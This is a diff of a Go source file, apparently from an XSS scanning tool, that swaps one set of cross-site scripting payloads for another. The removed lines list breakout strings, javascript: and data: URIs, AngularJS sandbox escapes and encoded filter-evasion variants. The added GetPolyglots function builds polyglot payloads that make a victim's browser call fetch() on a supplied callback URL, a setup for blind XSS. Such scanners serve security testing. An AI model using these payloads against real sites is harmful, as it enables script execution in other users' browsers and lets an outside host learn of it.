@@ -1,103 +1,20 @@
 package payloads
 
-import "github.com/lcalzada-xor/xxss/v2/pkg/models"
+import "fmt"
 
-// Polyglots is a map of context-specific XSS polyglots.
-// These payloads are designed to work in multiple contexts simultaneously.
-var Polyglots = map[models.ReflectionContext][]string{
-	models.ContextHTML: {
-		// 0xSobky's Polyglot: Works in HTML, Attributes, and Script blocks
-		"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
-		// Standard script injection
-		"<script>alert(1)</script>",
-		// Image onerror
-		"<img src=x onerror=alert(1)>",
-	},
-	models.ContextJavaScript: {
-		// Break out of single quotes
-		"';alert(1);//",
-		// Break out of double quotes
-		"\";alert(1);//",
-		// Break out of template literals
-		"`-alert(1)-`",
-		// Polyglot for JS strings
-		"';alert(1);/*",
-	},
-	models.ContextAttribute: {
-		// Break out of double quotes and add event handler
-		"\" onmouseover=\"alert(1)",
-		// Break out of single quotes and add event handler
-		"' onmouseover='alert(1)",
-		// Break out of tag
-		"\"><script>alert(1)</script>",
-	},
-	models.ContextURL: {
-		// Javascript protocol
-		"javascript:alert(1)",
-		// Data URI
-		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-	},
-	models.ContextTemplateLiteral: {
-		// Break out of template literal
-		"${alert(1)}",
-		"`+alert(1)+`",
-		"${alert`1`}",
-	},
-	models.ContextSVG: {
-		// SVG-specific payloads
-		"<set attributeName=onmouseover value=alert(1)>",
-		"<animate onbegin=alert(1)>",
-		"<svg/onload=alert(1)>",
-	},
-	models.ContextMetaRefresh: {
-		// Meta refresh URL injection
-		"javascript:alert(1)",
-		"data:text/html,<script>alert(1)</script>",
-	},
-	models.ContextDataURI: {
-		// Data URI XSS
-		"data:text/html,<script>alert(1)</script>",
-		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-	},
-	models.ContextComment: {
-		// Close comment and inject script
-		"--><script>alert(1)</script>",
-	},
-	models.ContextAngular: {
-		// AngularJS sandbox escape payloads
-		"{{constructor.constructor('alert(1)')()}}",
-		"{{[].pop.constructor('alert(1)')()}}",
-		"{{$on.constructor('alert(1)')()}}",
-		"{{a='alert';b='(1)';constructor.constructor(a+b)()}}",
-	},
-}
-
-// GetPolyglot returns a suggested polyglot based on the context.
-// It prioritizes the most versatile polyglot for the given context.
-func GetPolyglot(context models.ReflectionContext) string {
-	// Default to the "Ultimate Polyglot" if context is unknown or generic HTML
-	defaultPolyglot := "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e"
-
-	if payloads, ok := Polyglots[context]; ok && len(payloads) > 0 {
-		return payloads[0]
-	}
-
-	return defaultPolyglot
-}
-
-// GetJavaScriptURLVariants returns various encoding variants of javascript: URLs
-// Useful when certain characters are blocked in URL contexts
-func GetJavaScriptURLVariants() []string {
+// GetPolyglots returns a list of advanced polyglot payloads injected with the callback URL
+func GetPolyglots(callbackURL string) []string {
 	return []string{
-		"javascript:alert(1)",
-		"javascript:alert%281%29",           // URL encoded parens
-		"javascript:alert\\x281\\x29",       // Hex encoded parens
-		"javascript:alert\\u00281\\u0029",   // Unicode encoded parens
-		"javascript:alert`1`",               // Template literals
-		"javascript://comment%0aalert(1)",   // Newline bypass
-		"javascript:void(alert(1))",         // void wrapper
-		"javascript:window.alert(1)",        // window prefix
-		"javascript:eval('alert(1)')",       // eval wrapper
-		"javascript:setTimeout('alert(1)')", // setTimeout wrapper
+		// 0xSobky's Polyglot (Modified for Blind XSS)
+		fmt.Sprintf("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=fetch('%s') )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch('%s')//>\\x3e", callbackURL, callbackURL),
+
+		// Rsnake's Polyglot (Modernized)
+		fmt.Sprintf("javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/fetch('%s')//>", callbackURL),
+
+		// HTML/JS/CSS Polyglot
+		fmt.Sprintf("\"></script><script>/*%s*/fetch('%s')</script>", callbackURL, callbackURL),
+
+		// SVG/XML Polyglot
+		fmt.Sprintf("<![CDATA[<]]> <svg/onload=fetch('%s')>", callbackURL),
 	}
 }
